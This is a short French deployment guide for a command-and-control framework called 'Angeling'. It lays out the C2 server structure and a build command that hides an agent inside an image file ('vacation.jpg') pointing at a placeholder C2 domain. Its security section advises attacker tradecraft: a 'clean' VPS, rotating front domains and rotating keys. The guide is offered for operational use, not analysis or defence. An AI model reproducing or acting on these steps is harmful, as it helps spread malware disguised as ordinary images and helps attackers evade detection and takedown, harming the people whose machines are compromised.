# Angeling Deployment Guide

## Structure
```
deploy/
├── server/              # Serveur C2
│   ├── Dockerfile      # Configuration Docker pour le serveur
│   ├── requirements.txt # Dépendances Python
│   ├── server.py       # Code du serveur C2
│   └── nginx.conf      # Configuration Nginx
├── client/             # Configuration client
│   ├── config.json     # Template de configuration
│   └── images/         # Images de base pour polyglot
└── scripts/            # Scripts utilitaires
    ├── build.sh        # Script de build
    └── deploy.sh       # Script de déploiement
```

## Quick Start

1. Configuration du serveur :
```bash
cd server
docker-compose up -d
```

2. Génération d'un agent :
```bash
cd client
./build.sh --image vacation.jpg --c2 your-server.com
```

3. Administration :
- Interface web : https://your-server.com:8443
- API : https://your-server.com:8443/api

## Sécurité

- Utilisez des certificats SSL valides
- Configurez correctement le pare-feu
- Utilisez un VPS "propre"
- Changez régulièrement les domaines frontaux
- Activez la rotation des clés
